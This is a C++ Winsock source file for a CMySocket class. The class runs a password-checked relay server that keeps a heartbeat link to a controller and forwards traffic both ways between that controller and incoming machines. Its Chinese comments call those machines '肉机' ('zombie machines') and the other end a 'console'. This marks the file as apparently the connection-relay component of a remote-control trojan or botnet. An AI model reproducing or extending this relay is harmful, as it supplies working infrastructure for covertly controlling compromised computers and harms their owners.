// MySocket.cpp: implementation of the CMySocket class.
//
//////////////////////////////////////////////////////////////////////

#include "stdafx.h"
#include "MySocket.h"

#ifdef _DEBUG
#undef THIS_FILE
static char THIS_FILE[]=__FILE__;
#define new DEBUG_NEW
#endif

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

SOCKETINFO m_SocketInfo = {0};

CMySocket::CMySocket()
{
	m_Socket = NULL;
}

CMySocket::~CMySocket()
{
	Close();
}

SOCKET CMySocket::GetConnectSocket(LPCTSTR pServerAddr, UINT nServerPort)
{
	struct sockaddr_in	m_ServerAddr = {0}; 
	int			m_AddrLen = sizeof(struct sockaddr_in);
	SOCKET		m_Socket = 0;

	char m_sServerIp[MAX_PATH] = {0};
	lstrcpy(m_sServerIp, pServerAddr);
	DWORD dIp = inet_addr(m_sServerIp);
	if(dIp == INADDR_NONE)
	{
		PHOSTENT hostinfo = gethostbyname(m_sServerIp);
		if(hostinfo == NULL)
		{
			return NULL;
		}
		struct sockaddr_in dest = {0};
		CopyMemory(&(dest.sin_addr), hostinfo->h_addr_list[0], hostinfo->h_length);
		lstrcpyA(m_sServerIp, inet_ntoa(dest.sin_addr));
	}

	//初始化连接信息
	m_ServerAddr.sin_addr.S_un.S_addr = inet_addr(m_sServerIp);
	m_ServerAddr.sin_port = htons(nServerPort); 
	m_ServerAddr.sin_family = AF_INET;

	//创建发送套接字
	m_Socket = socket(AF_INET, SOCK_STREAM, 0);
	if(m_Socket == INVALID_SOCKET)
	{
		return NULL;
	}
	
	//连接客户计算机
	if(connect(m_Socket, (sockaddr*)& m_ServerAddr, m_AddrLen) == SOCKET_ERROR) 
	{ 
		closesocket(m_Socket); 
		return NULL;
	}

	BOOL nodelayval = TRUE;
	if (setsockopt(m_Socket, IPPROTO_TCP, TCP_NODELAY, (const char *) &nodelayval, sizeof(BOOL)))
	{
		closesocket(m_Socket); 
		return NULL;
	}

	const int one = 1;
	if (setsockopt(m_Socket, SOL_SOCKET, SO_KEEPALIVE, (char *)&one, sizeof(one)))
    {
		closesocket(m_Socket); 
		return NULL;
    }

	//连接成功
	return m_Socket;
}

SOCKET CMySocket::GetListenSocket(WORD wPort)
{
	SOCKET		Sck = NULL;	
	sockaddr_in addr = {0};
	int optval = 1000000;

	memset(&addr, 0, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_port = htons(wPort);

	Sck = socket(AF_INET, SOCK_STREAM, 0);
	if(Sck==INVALID_SOCKET)
	{
		return FALSE;
	}

	if(bind(Sck, (sockaddr*) &addr, sizeof(addr)) == SOCKET_ERROR)
	{
		closesocket(Sck);
		return FALSE;
	}

	if(setsockopt(Sck, SOL_SOCKET, SO_SNDTIMEO, (char*) &optval, sizeof(optval)) == SOCKET_ERROR)
	{
		closesocket(Sck);
		return FALSE;
	}

	if(setsockopt(Sck, SOL_SOCKET, SO_RCVTIMEO, (char*) &optval, sizeof(optval))	== SOCKET_ERROR)
	{
		closesocket(Sck);
		return FALSE;
	}

	if(listen(Sck, SOMAXCONN) == SOCKET_ERROR)
	{
		closesocket(Sck);
		return FALSE;
	}
	return Sck;
}

BOOL CMySocket::StartWork(LPCTSTR pPort, LPCTSTR pPass)
{
	m_SocketInfo.m_Port = atoi(pPort);
	m_SocketInfo.m_Pass = atoi(pPass);

	m_Socket = GetListenSocket((WORD) m_SocketInfo.m_Port);
	if(m_Socket == NULL)
	{
		closesocket(m_Socket);
		m_Socket = NULL;
		return FALSE;
	}

	//排斥连接
	m_SocketInfo.hMetux = CreateMutex(NULL, FALSE, NULL);
	m_SocketInfo.hExitEvent = CreateEvent(NULL, TRUE, FALSE, NULL);

	//启动控制台连接
	hListenThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) DoListenThread, this, 0, NULL);
	return TRUE;
}

DWORD CMySocket::DoListenThread(LPVOID lPvoid)
{
	CMySocket* pThis = (CMySocket*) lPvoid;
	pThis->DoListen();
	return 0;
}

void CMySocket::DoListen()
{
	while(1)
	{
		//等待客户连接
		SOCKET m_AccSocket = accept(m_Socket, 0, 0);
		if(m_AccSocket == INVALID_SOCKET) 
		{
			break;
		}
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) DoChildWorkThread, (LPVOID) m_AccSocket, 0, NULL);
	}
}

DWORD CMySocket::DoChildWorkThread(LPVOID lPvoid)
{
	SOCKET sAccept = (SOCKET) lPvoid;

	//接受命令
	PROXYLOGININFO m_Info = {0};
	int ret = recv(sAccept, (char*) &m_Info.m_Cmd, sizeof(UINT), 0);
	if(ret == SOCKET_ERROR || ret == 0)
	{
		WaitForSingleObject(m_SocketInfo.hExitEvent, 1000);
		closesocket(sAccept);
		return 0;
	}

	//查看连接来自肉机
	if(m_Info.m_Cmd < p_CONNECT_START || m_Info.m_Cmd > p_CONNECT_END)
	{
		DoClientTransWork(sAccept, m_Info.m_Cmd);
		return 0;
	}

	//接收连接数据
	ret = recv(sAccept, (char*) &m_Info.m_Data, sizeof(DWORD), 0);
	if(ret == SOCKET_ERROR || ret == 0)
	{
		closesocket(sAccept);
		return 0;
	}

	//控制台普通数据中转连接
	if(m_Info.m_Cmd == P_CONNECT_DATA)
	{
		//发送套接字到目标线程
		for(int i = 0; i < 3; i++)
		{
			while(!PostThreadMessage(m_Info.m_Data, WM_GETDESSOCKET, (WPARAM) sAccept, GetCurrentThreadId()))
			{
				Sleep(10);
			}
		}
		return 0;
	}

	if(m_SocketInfo.m_Pass == m_Info.m_Data)
	{
		//连接成功
		m_Info.m_Cmd = P_CONNECT_SUCCESS;
		m_SocketInfo.m_Socket = sAccept;
	}
	else
	{
		//连接失败
		m_Info.m_Cmd = P_CONNECT_ERROR;
	}

	//发送数据
	if(send(sAccept, (char*) &m_Info, sizeof(PROXYLOGININFO), 0) == SOCKET_ERROR)
	{
		closesocket(sAccept);
	}

	if(m_Info.m_Cmd == P_CONNECT_ERROR)
	{
		closesocket(sAccept);
	}
	else
	{
		//心跳连接
		while(WaitForSingleObject(m_SocketInfo.hExitEvent, 120000) == WAIT_TIMEOUT)
		{
			WaitForSingleObject(m_SocketInfo.hMetux, 0xffffffff);
			m_Info.m_Cmd = P_CONNECT_ALIVE;
			if(send(m_SocketInfo.m_Socket, (char*) &m_Info, sizeof(PROXYLOGININFO), 0) == SOCKET_ERROR)
			{
				closesocket(m_SocketInfo.m_Socket);
				m_SocketInfo.m_Socket = NULL;
				ReleaseMutex(m_SocketInfo.hMetux);
				break;
			}
			ReleaseMutex(m_SocketInfo.hMetux);
		}
	}
	return 0;
}

DWORD CMySocket::DoClientTransWork(SOCKET sAccept, UINT nCmd)
{
	if(m_SocketInfo.m_Socket == NULL)
	{
		WaitForSingleObject(m_SocketInfo.hExitEvent, 1000);
		closesocket(sAccept);
		return 0;
	}

	//发送连接命令
	WaitForSingleObject(m_SocketInfo.hMetux, 0xffffffff);
	PROXYLOGININFO m_Info = {0};
	m_Info.m_Cmd = P_CONNECT_DATA;
	m_Info.m_Data = GetCurrentThreadId();
	if(send(m_SocketInfo.m_Socket, (char*) &m_Info, sizeof(PROXYLOGININFO), 0) == SOCKET_ERROR)
	{
		WaitForSingleObject(m_SocketInfo.hExitEvent, 1000);
		closesocket(sAccept);
		closesocket(m_SocketInfo.m_Socket);
		m_SocketInfo.m_Socket = NULL;
		ReleaseMutex(m_SocketInfo.hMetux);
		return 0;
	}
	ReleaseMutex(m_SocketInfo.hMetux);
	
	//等待连接建立
	SOCKET sConnect = NULL;
	MSG msg = {0};
    while(GetMessage(&msg, 0, 0, 0))
	{
		if(WM_GETDESSOCKET == msg.message)
		{
			if(msg.wParam != NULL)
			{
				sConnect = (SOCKET) msg.wParam;
			}
			break;
		}
 	}
	if(sConnect == NULL)
	{
		WaitForSingleObject(m_SocketInfo.hExitEvent, 1000);
		closesocket(sAccept);
		return 0;
	}

	//发送目标机器的IP地址和端口
	sockaddr_in m_addr = {0};
	int	addrlen = sizeof(sockaddr_in);
	getpeername(sAccept, (sockaddr*) &m_addr, &addrlen);
	if(send(sConnect, (char*) &m_addr, sizeof(sockaddr_in), 0) == SOCKET_ERROR)
	{
		WaitForSingleObject(m_SocketInfo.hExitEvent, 1000);
		closesocket(sAccept);
		closesocket(sConnect);
		return 0;
	}

	//发送截取的命令
	if(send(sConnect, (char*) &nCmd, sizeof(UINT), 0) == SOCKET_ERROR)
	{
		WaitForSingleObject(m_SocketInfo.hExitEvent, 1000);
		closesocket(sAccept);
		closesocket(sConnect);
		return 0;
	}

	//创建缓冲
	LPSENDRECVINFO pInfo = new SENDRECVINFO;
	pInfo->sSend = sAccept;
	pInfo->sRecv = sConnect;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) DoSendRecvThread, (LPVOID) pInfo, 0, NULL);

	pInfo = new SENDRECVINFO;
	pInfo->sSend = sConnect;
	pInfo->sRecv = sAccept;
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE) DoSendRecvThread, (LPVOID) pInfo, 0, NULL);
	return 0;	
}

DWORD CMySocket::DoSendRecvThread(LPVOID lPvoid)
{
	SENDRECVINFO m_Info = {0};
	memcpy(&m_Info, lPvoid, sizeof(SENDRECVINFO));
	delete (LPSENDRECVINFO) lPvoid;

	struct fd_set sset = {0};
	struct timeval waited = {0};
	waited.tv_sec = 30000000;
	waited.tv_usec= 0;
	int ret = 0;
	BYTE* m_Buf = new BYTE[1048576];
	while(WaitForSingleObject(m_SocketInfo.hExitEvent, 0) == WAIT_TIMEOUT)
	{
		//等待服务器数据
		FD_ZERO(&sset);
		FD_SET(m_Info.sRecv, &sset);
		if(select(m_Info.sRecv + 1, &sset, NULL, NULL, &waited) <= 0)
		{
			break;
		}

		//接收服务器数据
		ret = recv(m_Info.sRecv, (char*) m_Buf, 1048575, 0);
		if(ret <= 0) 
		{
			break;
		}

		send(m_Info.sSend, (char*) m_Buf, ret, 0);
	}
	delete [] m_Buf;
	closesocket(m_Info.sRecv);
	closesocket(m_Info.sSend);
	return 0;
}

void CMySocket::Close()
{
	if(m_Socket != NULL)
	{
		closesocket(m_Socket);
		m_Socket = NULL;
	}

	if(m_SocketInfo.m_Socket != NULL)
	{
		closesocket(m_SocketInfo.m_Socket);
		m_SocketInfo.m_Socket = NULL;
	}

	if(m_SocketInfo.hMetux != NULL)
	{
		CloseHandle(m_SocketInfo.hMetux);
		m_SocketInfo.hMetux = NULL;
	}

	if(m_SocketInfo.hExitEvent != NULL)
	{
		CloseHandle(m_SocketInfo.hExitEvent);
		m_SocketInfo.hExitEvent = NULL;
	}
}